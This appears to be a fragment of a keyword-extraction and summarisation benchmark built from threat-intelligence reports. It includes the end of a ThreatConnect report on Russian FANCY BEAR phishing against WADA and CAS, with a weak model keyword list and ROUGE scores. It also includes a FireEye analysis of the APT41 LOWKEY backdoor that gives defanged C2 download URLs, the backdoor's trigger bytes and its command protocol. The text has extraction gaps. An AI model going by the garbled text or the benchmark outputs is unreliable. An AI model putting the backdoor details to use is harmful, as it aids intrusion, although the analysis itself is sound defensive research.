below showsthe relationship between the identi ed domains, their registration and hosting information, known FANCY BEAR TTPs, and intended targets.The WADA and CAS-spoo ng domains and activity most likely are intended to support Russian government intelligence collection and/or in uence operations related to the WADA and CAS. Our assessment is based on the following  ndings:1. The registration of these domains on August 3rd and 8th, 2016 areconsistent with the timeline in which the WADA recommended banning all Russian athletes from the Olympic and Paralympic games.2. The use of 1&1 mail.com webmail addresses to register domainsmatches a TTP we previously identi ed [url scratch/] for FANCY BEAR actors.3. These domains were registered through ititch[.]com anddomains4bitcoins[.]com, two registrars that accept Bitcoins for payments. The use of such registrars also matches an identi ed [url TTP for FANCY BEAR actors. Two of our previous blog posts also highlighted domains at the ITitch [url itch-they-cant-scratch/] and Domains4bitcoins [url name servers and their associations to FANCY BEAR activity.A review of recently registered domains using the same name servers identi ed two other domains related to sports and athletics -- espn- com[.]co and espn-live[.]co. Espn-live.co was registered through ITitch on August 17. Espn-com[.]co was registered through ITitch on August 2, a day before wada-awa[.]org was registered through the same service. These domains no longer use ITitch name servers as both most likely were taken over by MarkMonitor on ESPN\u2019s behalf shortly after they were registered. No information on the original registrants could be identi ed and we do not have any indication that these domains were used maliciously; however, based on the timing, subject matter, and registrar used, this may represent an additional avenue through which the actors intended to pursue WADA and CAS-related targets.Anonymous Poland - What\u2019s Their Role?On August 12, 2016 hackread.com [url anti-doping-agency-site-hacked/] broke the story that the WADA and CAS had been hacked and thousands of accounts had been leaked. The subtitle for the story read: Anonymous Poland Hacked World Anti- doping Agency and Court of Arbitration for sport\u2019s server\u2019 server and leaked personal details for God knows what reason!We asked ourselves that very question - what beef does Anonymous Poland (@anpoland [url ) have with WADA and CAS? While it is plausible that the attacks were in response to the Tomasz Zielinski being sent home [url olympics-rio-weightlifting-pole-idUSKCN10K1Y2] for testing positive for a banned steroid nandrolone on August 9, such retaliation e orts are atypical for Anonymous Poland, which has previously focused [url on Polish politics and perceived issues with the  nancial, political, and media industries. To that end, is it possible that @anpoland is another platform that Russians are using to hide their hand in activity against the WADA and CAS?W H I T E P A P E R : M A T U R I N G A T H R E A T I N T E L L I G E N C E P R O G R A M [ H T T P : / / H U B S . L Y / H 0 3 S N J H 0 ]Of course, activity against WADA and CAS from hacktivists and Russian state sponsored actors are not mutually exclusive, so it is entirely possible that two groups could have targeted and/or compromised these organizations at the same time. However, the timing associated with the Russian phishing activity and Anonymous Poland\u2019s claims are very coincidental and suggest that the two may be involved. To that end, we reviewed Anonymous Poland\u2019s activities to determine whether they are whom they claim to be. Our  ndings include the following:1. @anpoland posted a video [url to Youtube that demonstrates how they purportedly used Acunetix to scan the CAS website and SQLMap[url to exploit CAS databases. The screen capture video shows the individual using a local admin account with Polish language settings. However, when the individual uses Firefox, we see in their browser history that they have previously issued Google searches from Google.ru (Russia) and Google.com (US) multiple times while Google.pl (Poland) is absent.Google.ru within the browser history might indicate that the user that created the Youtube video is originating, or has previously originated, from a Russian IP address. Although the user has Tor browser on their desktop it appears as if they failed to execute it, as it does not appear as an executing process during the hack demo.WADA Browser History [url Browser History [url v=day5Aq0bHsA&feature=youtu.be&t=296]1. The @anpoland Twitter account being cited by various news outletsas a source for this story, appears to have been inactive until the end of July 2016.1. The @anpoland account was established in April 2010, thesame timeframe as when Polish Air Force Flight 101 [url 154_crash] crashed several hundred meters short of the Smolensk airport runway in dense fog, killing everyone on board, including Polish President Kaczy\u0144ski. Russia\u2019s  nal report on the incident blamed the late president and his \u201cinebriated\u201d air force commander-in-chief for the accident.2. Beginning on August 1, the @anpoland account essentiallyresurfaced with claims that it had hacked the Ukrainian Ministry of Internal A airs and released hacked documents pertaining at gmarine.com[.]ua - a Ukrainian website hosted on a Russian IP.3. It\u2019s important to note that while the @anpoland account has a gap in posts from 2010 to 2016, it is possible the individual(s) running the account deleted older posts.2. Other social media accounts claiming a liation with Anonymous Poland, such as @anonpoland [url , and Anonymous\u2019 main twitter account [url are not publicizing the WADA compromise. The inability to con rm the @anpoland and HackRead story with several additional Anonymous Poland-related sources is suspect.1. Anonymous Poland Facebook[url accounts identi ed to date are focused on internal Polish politics and current events, apart from some posts referencing ISIS, most of the communications released call for action (mostly peaceful physical protests) in response to perceived issues with the  nancial, political, and media industries in the country.At this time, based on a lack of sources, we cannot conclude that @anpoland is another platform that Russian actors are using for in uence operations. However, mounting circumstantial evidence that negate @anpoland\u2019s claimed origins makes us skeptical that they are in fact a legitimate Anonymous hacktivist group.Fancy Bear\u2019s Roid RageUltimately, successful operations against WADA and CAS stakeholders could yield Russia with intelligence that could facilitate the following:1. Follow-on operations seeking to in uence or coerce individuals inkey decision-making positions within those organizations. Such in uence might ultimately result in decisions from those organizations that bene t Russian athletes.2. Document or data collection that can be used in in uenceoperations or propaganda derisive to the WADA, CAS, or theirstakeholders.3. Follow-on operations targeting speci c individuals to gain additionalcollection.4. Intelligence collection that informs Russian e orts to circumventdoping and testing procedures, like those described in the McLaren Report.5. Publicly intimidate other potential whistleblowers and deter themfrom coming forward.As evidenced in the Stepanova compromise [url ama.org/en/media/news/2016-08/wada-con rms-illegal-activity-on- yuliya-stepanovas-adams-account] , we would also expect to see additional Russian cyber operations targeting Professor McLaren and the main source of the investigation, Dr. Rodchenkov. Collection against these individuals could also facilitate Russian e orts like those previously listed, or e ort to conduct in uence operations that privately intimidate or publicly cast those individuals in a negative light.Russian activity targeting these organizations is an important example of how Russia responds to wide-reaching current events that have negative implications for Moscow. Organizations involved in such events can reasonably expect to experience targeted Russian cyber operations that ultimately facilitate retaliatory in uence or propaganda e orts against them. Knowledge of this TTP, and others associated with Russian APT activity, can help those organizations augment their security posture and defend against such retaliation.ThreatConnect would very much like to work with WADA and Yuliya Stepanova if either would be open to sharing any details to help us better understand the details surrounding this event feel free to contact us.Read the full series of ThreatConnect posts following the DNC Breach: \u201cRebooting Watergate: Tapping into the Democratic NationalCommittee [url democratic-national-committee/] \u201d, \u201cShiny Object? Guccifer 2.0 and the DNC Breach [url breach/] \u201c, \u201cWhat\u2019s in a Name Server? [url \u201c, \u201cGuccifer 2.0: the Man, the Myth, the Legend? [url claims/] \u201c, \u201cGuccifer 2.0: All Roads Lead to Russia [url \u201c, \u201cFANCY BEAR Has an (IT) Itch that They Can\u2019t Scratch [url scratch/] \u201c, \"Does a BEAR Leak in the Woods? [url woods/] \", \"Russian Cyber Operations on Steroids [url agency-phishing/] \", and \"Can a BEAR Fit Down a Rabbit Hole? [url hole/] \".Categories: Blog , Featured Article , Threat ResearchABOUT THE AUTHORThe ThreatConnect Research Team: is an elite group of globally- acknowledged cybersecurity experts, dedicated to tracking down existing and emerging cyber threats. We scrutinize trends, technology and socio-political motivators to develop comprehensive knowledge of the cyber landscape. Then, we share what we\u2019ve learned so that you can protect your organization, and your team can take precise action against threats. ", "generated_text": "ThreatConnect; cyber operations; phishing emails; the World Anti-Doping Agency; DNC; phishing emails; domains; the WADA; Wada-ama.org; tas-cass[.]org; the Court of Arbitration for Sport; the WADA; the CAS website; Yuliya Stepanova; Russia; the Olympic and Paralympic games; Rio de Janeiro, Brazil; the phishing; I H; TTPs; the network; Russian hacking; e orts; individuals; organizations; the use; tactics; techniques; procedures; the FBI; the investigation; the use.", "ref_text": "<START-1>The PDF discusses Russian cyber operations targeting the World Anti-Doping Agency (WADA) and the Court of Arbitration for Sport (CAS) in retaliation for the recommendation to ban all Russian athletes from the 2016 Olympic and Paralympic Games. - In mid-August 2016, WADA alerted stakeholders to phishing emails using spoofed domains that were found to be recently registered by addresses tied to the Russian cyber espionage group FANCY BEAR. - Another domain registered around the same time, tas-cass[.]org, was identified as spoofing CAS's domain. The registration and hosting details of these domains match known FANCY BEAR tactics. - The report suggests FANCY BEAR's operations against WADA and CAS are intended to facilitate Russian intelligence collection and influence operations in response to the recommended athlete ban. - In early August, a hacktivist group Anonymous Poland claimed to have hacked WADA and CAS servers and leaked data. However, Anonymous Poland appears inactive until end of July 2016 and evidence suggests the hackers may actually be of Russian origin. - The report concludes that organizations involved in events with negative implications for Russia can expect to experience cyber operations by Russia facilitating retaliatory influence or propaganda efforts. Knowledge of Russian APT tactics can help defend against such retaliation. <END-1>", "t5/keyword/hint_hit_precision": 0.28125, "t5/word/hint_hit_recall": 0.09313725490196079, "gpt3/lexical/rouge_rouge1": 0.5322128851540617, "gpt3/lexical/rouge_rouge2": 0.24788732394366195, "gpt3/lexical/rouge_rougeL": 0.3081232492997199, "gpt3/lexical/rouge_rougeLsum": 0.3081232492997199, "gpt3_generated_text": ["The article discusses recent cyber operations conducted by Russian actors, specifically the phishing emails targeting the World Anti-Doping Agency (WADA) and the Court of Arbitration for Sport (CAS). The phishing emails used domains that spoofed the legitimate WADA domain, wada-ama.org, and were found to be consistent with Russian FANCY BEAR tactics, techniques, and procedures (TTPs). This activity is believed to be in response to the WADA's recommendation to ban all Russian athletes from the Olympic and Paralympic games in Rio de Janeiro, Brazil. The article also mentions the hacking of WADA and CAS servers, as well as the compromise of Yuliya Stepanova's accounts, a Russian athlete who exposed a state-sponsored doping scandal. The article highlights ThreatConnect's efforts to alert WADA and CAS about these findings and shares indicators from the activity. The FBI is involved in investigating the use of Russian hacking in these operations."]}, {"split_name": "val", "sample_id": "val_116", "prompt_text": "Extract the keywords: LOWKEY: Hunting for the Missing Volume Serial ID \ufb01reeye.com/blog/threat-research/2019/10/lowkey-hunting-for-the-missing-volume-serial-id.htmlIn August 2019, FireEye released the \u201cDouble Dragon\u201d report on our newest graduated threat group: APT41. A China-nexus dual espionage and \ufb01nancially-focused group, APT41 targets industries such as gaming, healthcare, high-tech, higher education, telecommunications, and travel services.This blog post is about the sophisticated passive backdoor we track as LOWKEY, mentioned in the APT41 report and recently unveiled at the FireEye Cyber Defense Summit. We observed LOWKEY being used in highly targeted attacks, utilizing payloads that run only on speci\ufb01c systems. Additional malware family names are used in the blog post and brie\ufb02y described. For a complete overview of malware used by APT41 please refer to the Technical Annex section of our APT41 report.The blog post is split into three parts, which are shown in Figure 1. The \ufb01rst describes how we managed to analyze the encrypted payloads. The second part features position independent loaders we observed in multiple samples, adding an additional layer of obfuscation. The \ufb01nal part is about the actual backdoor we call LOWKEY, which comes in two variants, a passive TCP listener and a passive HTTP listener targeting Internet Information Services (IIS).Figure 1: Blog post overview DEADEYE \u2013 RC5url\ufb01reeye.com/blog/threat-research/2019/10/lowkey-hunting-for-the-missing-volume-serial-id.html1/1710/16/2019LOWKEY: Hunting for the Missing Volume Serial ID | FireEye IncTracking APT41 activities over the past months, we observed multiple samples that shared two unique features: the use of RC5 encryption which we don\u2019t encounter often, and a unique string \u201cf@Ukd!rCto R$.\u201d. We track these samples as DEADEYE.DEADEYE comes in multiple variants:DEADEYE.DOWN has the capability to download additional payloads. DEADEYE.APPEND has additional payloads appended to it. DEADEYE.EXT loads payloads that are already present on the system.DEADEYE.DOWN attempts to download two \ufb01les on the \ufb01rst execution of the malware.The \ufb01rst \ufb01le is downloaded from hxxp://checkin.travelsanignacio[.]com/static/20170730.jpg. The command and control (C2) server response is \ufb01rst RC5 decrypted with the key \u201cwsprintfA\u201d and then RC5 encrypted with a different key and written to disk as <MODULE_NAME>.mui.The RC5 key is constructed using the volume serial number of the C drive. The volume serial number is a 4-byte value, usually based on the install time of the system. The volume serial number is XORed with the hard-coded constant \u201cf@Ukd!rCto R$.\u201d and then converted to hex to derive a key of up to 28 bytes in length. The key length can vary if the XORed value contains an embedded zero byte because the lstrlenA API call is used to determine the length of it. Note that the lstrlenA API call happens before the result is converted to hex. If the index of the byte modulo 4 is zero, the hex conversion is in uppercase. The key derivation is illustrated in Table 1.Volume Serial number of C drive, for example 0xAABBCCDDF ^ 0xAA= 0xCCuppercase@ ^ 0xBB= 0xFBlowercaseU ^ 0xCC= 0x99lowercasek ^ 0xDD= 0xB6lowercased ^ 0xAA= 0xCEuppercase! ^ 0xBB= 0x9Alowercaser ^ 0xCC= 0xBElowercaseC ^ 0xDD= 0x9Elowercaset ^ 0xAA= 0xDEuppercaseurl\ufb01reeye.com/blog/threat-research/2019/10/lowkey-hunting-for-the-missing-volume-serial-id.html2/1710/16/2019LOWKEY: Hunting for the Missing Volume Serial ID | FireEye Inco ^ 0xBB= 0xD4lowercase(0x20) ^ 0xCC= 0xEClowercaseR ^ 0xDD= 0x8Flowercase$ ^ 0xAA= 0x8Euppercase. ^ 0xBB= 0x95lowercaseDerived key CCfb99b6CE9abe9eDEd4ec8f8E95Table 1: Key derivation exampleThe second \ufb01le is downloaded from hxxp://checkin.travelsanignacio[.]com/static/20160204.jpg. The C2 response is RC5 decrypted with the key \u201cwsprintfA\u201d and then XORed with 0x74, before it to decrypt the \ufb01le using RC5 encryption. This effectively decrypts the \ufb01le the malware just downloaded and stored encrypted on the system previously. As the \ufb01le has been encrypted with a key based on the volume serial number it can only be executed on the system it was downloaded on or a system that has the same volume serial number, which would be a remarkable encrypted \ufb01le in a hex editor reveals a high entropy (7.999779/8). RC5 uses Electronic Code Book (ECB) mode by default. ECB means that each code block (64 bit) is encrypted independent from other code blocks. This means the same plaintext block always results in the same cipher text, independent from its position in the binary. The \ufb01le has 792933 bytes in total but almost no duplicate cipher blocks, which means the data likely has an additional layer of encryption.Without the correct volume serial number nor any knowledge about the plaintext there is no knowledge of the current sample. DEADEYE.APPEND Fortunately searching for the unique string \u201cf@Ukd!rCto R$.\u201c in combination with artifacts from RC5 reveals additional samples. One of the related samples is DEADEYE.APPEND (MD5: (url\ufb01le-supply-chain-attack/90380/). This sample is different because it is protected with VMProtect and has the obfuscated binary appended to it. The embedded binary starts at offset 3287552 which can be seen in Figure 3 with the differing File Size and PE Size.url\ufb01reeye.com/blog/threat-research/2019/10/lowkey-hunting-for-the-missing-volume-serial-id.html4/1710/16/2019LOWKEY: Hunting for the Missing Volume Serial ID | FireEye IncFigure 3: A look at the PE header reveals a larger \ufb01le size than PE sizeThe encrypted payload has a slightly lower entropy of 7.990713 out of 8. Looking at the embedded binary in a hex editor reveals multiple occurrences of the byte pattern 51 36 94 A4 26 5B 0F 19, as seen in Figure 4. As this pattern occurs multiple times in a row in the middle of the encrypted data and ECB mode is being used, an educated guess is that the plaintext is supposed RC5 Brute Forcer With this knowledge we decided to take a reference implementation of RC5 and add a main function that accounts for the key derivation algorithm used by the malware samples (see Figure 5). Brute forcing is possible as the key is derived from a single DWORD; even though the \ufb01nal key length might be 28 bytes, there are only 4294967296 possible keys. The code shown in Figure 5 generates all possible volume serial numbers, derives the key from them and tries to decrypt 51 36 94 A4 26 5B 0F 19 to 00 00 00 00 00 00 00 00. Running the RC5 brute forcer for a couple of minutes shows the correct volume serial number for the sample, which is 0xc25cff4c.Note if you want to run the brute forcer yourself The number of DWORDs of the key in the reference implementation we used is represented by the global c, and we had to change it to 7 to match the malware\u2019s key length of 28 bytes. There were some issues with the conversion because in the malware a zero byte within the generated key ultimately leads to a shorter key length. The implementation we used uses a hard-coded key length (c), so we generated multiple executables with c = 6, c = 5, c = 4\u2026 as these usually only ran for a couple of minutes to cover the entire key space. All the samples mentioned in the Appendix 1 could be solved with c = 7 or c = 6.url\ufb01reeye.com/blog/threat-research/2019/10/lowkey-hunting-for-the-missing-volume-serial-id.html5/1710/16/2019LOWKEY: Hunting for the Missing Volume Serial ID | FireEye IncFigure 5: Main function RC5 brute forcerThe decrypted payload belongs to the malware family POISONPLUG (MD5: backdoor with plug-in capabilities. The malware is capable of registry or service persistence, self- removal, plug-in execution, and network connection forwarding. POISONPLUG has been observed using social platforms to host encoded command and control commands.We con\ufb01rmed the \ufb01ndings from Kaspersky and additionally found a second command and control URL hxxps://steamcommunity[.]com/id/oswal053, as mentioned in our APT 41 report.url\ufb01reeye.com/blog/threat-research/2019/10/lowkey-hunting-for-the-missing-volume-serial-id.html6/1710/16/2019LOWKEY: Hunting for the Missing Volume Serial ID | FireEye IncTaking everything into account that we learned from DEADEYE.APPEND to match with the ones of the decrypted POISONPLUG payload did not yield any results.Fortunately, we found additional samples that use the same encryption scheme. In one of the samples the malware authors included two checks to validate the decrypted payload. The expected plaintext at the speci\ufb01ed offsets for DEADEYE.APPEND (MD5: which we could then manually check. The correct volume serial number for the encrypted mui is 0x243e2562. Analysis determined the decrypted \ufb01le is XMRig miner. This also explains why the dropper downloads two \ufb01les. The \ufb01rst, <MODULE_NAME>.mui is the crypto miner, and the second C:\\Windows\\System32\\wcnapi.mui, is the con\ufb01guration. The decrypted mui contains another layer of obfuscation and is eventually executed with the command x -c wcnapi.mui. An explanation on how the command was obtained and the additional layer of obfuscation is given in the next part of the blog post.For a list of samples with the corresponding volume serial numbers, please refer to Appendix 1. Additional RC4 Layer An additional RC4 layer has been identi\ufb01ed in droppers used by APT41, which we internally track as DEADEYE. The layer has been previously detailed in a blog post by ESET. We wanted to provide some additional information on this, as it was used in some of the samples we managed to brute force.The additional layer is position independent shellcode containing a re\ufb02ective DLL loader. The loader decrypts an RC4 encrypted payload and loads it in memory. The code itself is a straight forward loader with the exception of some interesting artifacts identi\ufb01ed during analysis.url\ufb01reeye.com/blog/threat-research/2019/10/lowkey-hunting-for-the-missing-volume-serial-id.html7/1710/16/2019LOWKEY: Hunting for the Missing Volume Serial ID | FireEye IncAs mentioned in the blog post by ESET, the encrypted payload is prepended with a header. It contains the RC4 encryption key and two \ufb01elds of variable length, which have previously been identi\ufb01ed as \ufb01le names. These two \ufb01elds are encrypted with the same RC4 encryption key that is also used to decrypt the payload. The header is shown in Table 3.Header bytesMeaning0 \u2013 1516 \u2013 1920 \u2013 2324 \u2013 2728 \u2013 3132 \u2013 3536 \u2013 3940 \u2013 (40 + CAS)RC4 key XOR encoded with 0x37Size of loader stub before the headerRC4 key sizeCommand ASCII size (CAS)Command UNICODE size (CUS)Size of encrypted payloadLaunch typeCommand ASCII(40 + CAS) \u2013 (40 + CAS + CUS)Command UNICODE(40 + CAS + CUS) \u2013 (40 + CAS + CUS + size of encrypted payload)Encrypted payloadTable 3: RC4 header overviewLooking at the payloads hidden behind the RC5 layer, we observed, that these \ufb01elds are not limited to \ufb01le names, instead they can also contain commands used by the re\ufb02ective loader. If no command is speci\ufb01ed, the default parameter is the \ufb01le name of the loaded payload. In some instances, this revealed the full \ufb01le path and \ufb01le name in the development environment. Table 4 shows some paths and \ufb01le names. This is also how we found the command (x -c wcnapi.mui) used to launch the decrypted mui \ufb01le from the \ufb01rst part of the blog post.MD5 hashArguments found in the RC4 layer7f05d410dc0d1b0e7a3fcc6cd\u2010 da7a2ffE:\\code\\PortReuse\\3389-share\\DeviceIOContrl-Hook\\v1.3-53\\Inner- Loader\\x64\\Release\\Inner-Loader.dll7f05d410dc0d1b0e7a3fcc6cd\u2010 da7a2ffE:\\code\\PortReuse\\3389-share\\DeviceIOContrl-Hook\\v1.3- 53\\NetAgent\\x64\\Release\\NetAgent.exeurl\ufb01reeye.com/blog/threat-research/2019/10/lowkey-hunting-for-the-missing-volume-serial-id.html8/1710/16/2019LOWKEY: Hunting for the Missing Volume Serial ID | FireEye Inc7f05d410dc0d1b0e7a3fcc6cd\u2010 da7a2ffE:\\code\\PortReuse\\3389-share\\DeviceIOContrl-Hook\\v1.3- 53\\SK3.x\\x64\\Release\\SK3.x.exe7f05d410dc0d1b0e7a3fcc6cd\u2010 d805de683822bf4922aecb9bfef5E:\\code\\PortReuse\\iis-share\\2.5\\IIS_Share\\x64\\Release\\IIS_Share.dllc11d\u2010 d805de683822bf4922aecb9bfef5UserFunction.dllc11d\u2010 d805de683822bf4922aecb9bfef5ProcTran.dllTable 4: Decrypted paths and \ufb01le names LOWKEY The \ufb01nal part of the blog post describes the capabilities of the passive backdoor LOWKEY (MD5: commands for a reverse shell, uploading and downloading \ufb01les, listing and killing processes and \ufb01le management. We have identi\ufb01ed two variants of the LOWKEY backdoor.The \ufb01rst is a TCP variant that listens on port 53, and the second is an HTTP variant that listens on TCP port 80. The HTTP variant intercepts URL requests matching the UrlPre\ufb01x url The + in the given UrlPre\ufb01x means that it will match any host name. It has been brie\ufb02y mentioned by Kaspersky as \u201cunknown backdoor\u201d.Both variants are loaded by the re\ufb02ective loader described in the previous part of the blog post. This means we were able to extract the original \ufb01le names. They contain meaningful names and E:\\code\\PortReuse\\3389-share\\DeviceIOContrl-Hook\\v1.3-53\\SK3.x\\x64\\Release\\SK3.x.exeThe interesting parts are shown in Figure 6. PortReuse describes the general idea behind the backdoor, to operate on a well-known port. The paths also contain version numbers 2.5 and v1.3- 53. IIS_Share is used for the HTTP variant and describes the targeted application, DeviceIOContrl-Hook is used for the TCP variant.url\ufb01reeye.com/blog/threat-research/2019/10/lowkey-hunting-for-the-missing-volume-serial-id.html9/1710/16/2019LOWKEY: Hunting for the Missing Volume Serial ID | FireEye IncFigure 6: Overview important parts of executable pathurl\ufb01reeye.com/blog/threat-research/2019/10/lowkey-hunting-for-the-missing-volume-serial-id.html10/1710/16/2019LOWKEY: Hunting for the Missing Volume Serial ID | FireEye IncBoth LOWKEY variants are functionally identical with one exception. The TCP variant relies on a second component, a user mode rootkit that is capable of intercepting incoming TCP connections. The internal name used by the developers for that component is E:\\code\\PortReuse\\3389-share\\DeviceIOContrl-Hook\\v1.3- 53\\NetAgent\\x64\\Release\\NetAgent.exe.Figure 7: LOWKEY components Inner-Loader.dll Inner-Loader.dll is a watch guard for the LOWKEY backdoor. It leverages the GetExtendedTcpTable API to retrieve all processes with an open TCP connection. If a process is listening on TCP port 53 it injects NetAgent.exe into the process. This is done in a loop with a 10 second delay. The loader exits the loop when NetAgent.exe has been successfully injected. After the injection it will create a new thread for the LOWKEY backdoor (SK3.x.exe).The watch guard enters an endless loop that executes every 20 minutes and ensures that the NetAgent.exe and the LOWKEY backdoor are still active. If this is not the case it will relaunch the backdoor or reinject the NetAgent.exe. NetAgent.exeNetAgent.exe is a user mode rootkit that provides covert communication with the LOWKEY backdoor component. It forwards incoming packets, after receiving the byte sequence FF FF 01 00 00 01 00 00 00 00 00 00, to the named pipe \\\\.\\pipe\\Microsoft Ole Object {30000-7100-12985- 00001-00001}.The component works by hooking the NtDeviceIoControlFile API. It does that by allocating a suspiciously large region of memory, which is used as a global hook table. The table consists of 0x668A0 bytes and has read, write and execute permissions set.url\ufb01reeye.com/blog/threat-research/2019/10/lowkey-hunting-for-the-missing-volume-serial-id.html11/1710/16/2019LOWKEY: Hunting for the Missing Volume Serial ID | FireEye IncEach hook table entry consists of 3 pointers. The \ufb01rst points to memory containing the original 11 bytes of each hooked function, the second entry contains a pointer to the remaining original instructions and the third pointer points to the function hook. The malware will only hook one function in this manner and therefore allocates an unnecessary large amount of memory. The malware was designed to hook up to 10000 functions this way.The hook function begins by iterating the global hook table and compares the pointer to the hook function to itself. This is done to \ufb01nd the original instructions for the installed hook, in this case NtDeviceIoControlFile. The malware then executes the saved instructions which results in a regular NtDeviceIoControlFile API call. Afterwards the IoControlCode is compared to 0x12017 (AFD_RECV).If the IoControlCode does not match, the original API call results are returned.If they match the malware compares the \ufb01rst 12 bytes of the incoming data. As it is effectively a TCP packet, it is parsing the TCP header to get the data of the packet. The \ufb01rst 12 bytes of the data section are compared against the hard-coded byte pattern: FF FF 01 00 00 01 00 00 00 00 00 00.If they match it expects to receive additional data, which seems to be unused, and then responds with a 16 byte header 00 00 00 00 00 91 03 00 00 00 00 00 80 1F 00 00, which seems to be hard-coded and to indicate that following packets will be forwarded to the named pipe \\\\.\\pipe\\Microsoft Ole Object {30000-7100-12985-00001-00001}. The backdoor component (SK3.x.exe) receives and sends data to the named pipe. The hook function will forward all received data from the named pipe back to the socket, effectively allowing a covert communication between the named pipe and the socket. SK3.x.exe SK3.x.exe is the actual backdoor component. It supports writing and reading \ufb01les, modi\ufb01cation of \ufb01le properties, an interactive command shell, TCP relay functionality and listing running processes. The backdoor opens a named pipe \\\\.\\pipe\\Microsoft Ole Object {30000-7100-12985- 00001-00001} for communication.Data received by the backdoor is encrypted with RC4 using the key \u201cCreateThread\u201c and then XORed with 0x77. All data sent by the backdoor uses the same encryption in reverse order (\ufb01rst XOR with 0x77, then RC4 encrypted with the key \u201cCreateThread\u201c). Encrypted data is preceded by a 16-byte header which is unencrypted containing an identi\ufb01er and the size of the following encrypted packet.An example header looks as follows: 00 00 00 00 00 FD 00 00 10 00 00 00 00 00 00 00BytesMeaning00 00 00 00 00unknownurl\ufb01reeye.com/blog/threat-research/2019/10/lowkey-hunting-for-the-missing-volume-serial-id.html12/1710/16/2019LOWKEY: Hunting for the Missing Volume Serial ID | FireEye IncFD 00Bytes 5 and 6 are the command identi\ufb01er, for a list of all supported identi\ufb01ers check Table 6 and Table 7.00unknown10 00 00 00Size of the encrypted packet that is send after the header00 00 00 00unknownTable 5: Subcomponents of headerThe backdoor supports the commands listed in tables Table 6 and Table 7. Most commands expect a string at the beginning which likely describes the command and is for the convenience of the operators, but this string isn't actively used by the malware and could be anything. For example, KILL <PID> could also be A <PID>. Some of the commands rely on two payloads (UserFunction.dll and ProcTran.dll), that are embedded in the backdoor and are either injected into another process or launch another process. UserFunction.dll Userfunction.dll starts a hidden cmd.exe process, creates the named pipe \\\\.\\pipe\\Microsoft Ole Object {30000-7100-12985-00000-00000} and forwards all received data from the pipe to the standard input of the cmd.exe process. All output from the process is redirected back to the named pipe. This allows interaction with the shell over the named pipe. ProcTran.dll The component opens a TCP connection to the provided host and port, creates the named pipe \\\\.\\pipe\\Microsoft Ole Object {30000-7100-12985-00000-00001} and forwards all received data from the pipe to the opened TCP connection. All received packets on the connection are forwarded to the named pipe. This allows interaction with the TCP connection over the named <arg2>Provides a simple shell, that supports the following commands, dir, copy, move, del, sys\u2010 teminfo and cd. These match the functionality of standard commands from a shell. This is the only case where the <cmd> is actually used.0xC9<cmd> <arg1>The argument is interpreted as a process id (PID). The backdoor injects UserFunction.dll into the process, which is an interactive shell that forwards all input and output data to Microsoft Ole Object {30000-7100-12985-00000-00000}. The backdoor will then forward incoming data to the named pipe allowing for communication with the opened shell. If no PID is provided, the `cmd.exe` is launched as child process of the backdoor process with input and output redirected to the named pipe Microsoft Ole Object {30000-7100-12985- 00001-00001}url\ufb01reeye.com/blog/threat-research/2019/10/lowkey-hunting-for-the-missing-volume-serial-id.html13/1710/16/2019LOWKEY: Hunting for the Missing Volume Serial ID | FireEye Inc0xCA0xCB<cmd> <arg3>Writes data to a \ufb01le. The \ufb01rst argument is the <\ufb01le_name>, the second argument is an offset into the \ufb01leReads data from a \ufb01le. The \ufb01rst argument is the <\ufb01le_name>, the second argument is an offset into the \ufb01le, the third argument is optional, and the exact purpose is unknown0xFA-Lists running processes, including the process name, PID, process owner and the exe\u2010 cutable path0xFB<cmd> <arg1>0xFC <cmd> <arg1> <arg2>0xFD -0xFE-Kills the process with the provided process id (PID)Copies the \ufb01les CreationTime, LastAccessTime and LastWriteTime from the second ar\u2010 gument and applies them to the \ufb01rst argument. Both arguments are expected to be full \ufb01le paths. The order of the arguments is a bit unusual, as one would usually apply the ac\u2010 cess times from the second argument to the thirdList running processes with additional details like the SessonId and the CommandLine by executing the WMI query SELECT Name,ProcessId,SessionId,CommandLine,Exe\u2010 cutablePath FROM Win32_ProcessPing command, the malware responds with the following byte sequence 00 00 00 00 00 65 00 00 00 00 00 00 06 00 00 00. Experiments with the backdoor revealed that the iden\u2010 ti\ufb01er 0x65 seems to indicate a successful operation, whereas 0x66 indicates an error.Table 6: C2 commandsThe commands listed in Table 7 are used to provide functionality of a TCP traf\ufb01c relay. This allows operators to communicate through the backdoor with another host via TCP. This could be used for lateral movement in a network. For example, one instance of the backdoor could be used as a jump host and additional hosts in the target network could be reached via the TCP traf\ufb01c relay. Note that the commands 0xD2, 0xD3 and 0xD6 listed in Table 7 can be used in the main backdoor thread, without having to use the ProcTran.dll.Iden\u2010 <arg1>The argument is interpreted as a process id (PID). The backdoor injects ProcTran.dll into the process, which is a TCP traf\ufb01c relay component that forwards all input and output data to Microsoft Ole Object {30000-7100-12985-00000-00001}. The commands 0xD2, 0xD3 and 0xD6 can then be used with the component.0xD2<arg1> <arg2>Opens a connection to the provided host and port, the \ufb01rst argument is the host, the sec\u2010 ond the port. On success a header with the identi\ufb01er set to 0xD4 is returned (00 00 00 00 00 D4 00 00 00 00 00 00 00 00 00 00). This effectively establishes a TCP traf\ufb01c relay allowing operators to communicate with another system through the backdoored machine.url\ufb01reeye.com/blog/threat-research/2019/10/lowkey-hunting-for-the-missing-volume-serial-id.html14/1710/16/2019LOWKEY: Hunting for the Missing Volume Serial ID | FireEye Inc0xD3<arg1>Receives and sends data over the connection opened by the 0xD2 command. Received data is \ufb01rst RC4 decrypted with the key \u201cCreateThread\u201c and then single-byte XOR de\u2010 coded with 0x77. Data sent back is directly relayed without any additional encryption.0xD60xCF--Closes the socket connection that had been established by the 0xD2 commandCloses the named pipe Microsoft Ole Object {30000-7100-12985-00000-00001} that is used to communicate with the injected ProcTran.dll. This seems to terminate the thread in the targeted process by the 0x105 commandTable 7: C2 commands TCP relay Summary The TCP LOWKEY variant passively listens for the byte sequence FF FF 01 00 00 01 00 00 00 00 00 00 on TCP port 53 to be activated. The backdoor then uses up to three named pipes for communication. One pipe is used for the main communication of the backdoor, the other ones are used on demand for the embedded payloads.\\\\.\\pipe\\Microsoft Ole Object {30000-7100-12985-00001-00001} main communication pipe \\\\.\\pipe\\Microsoft Ole Object {30000-7100-12985-00000-00001} named pipe used for interaction with the TCP relay module ProcTran.dll \\\\.\\pipe\\Microsoft Ole Object {30000-7100-12985-00000-00000} named pipe used for the interactive shell module UserFunction.dllFigure 8 summarizes how the LOWKEY components interact with each other.url\ufb01reeye.com/blog/threat-research/2019/10/lowkey-hunting-for-the-missing-volume-serial-id.html15/1710/16/2019LOWKEY: Hunting for the Missing Volume Serial ID | FireEye IncFigure 8: LOWKEY passive backdoor overview AppendixMD5 HASHCorrect Volume 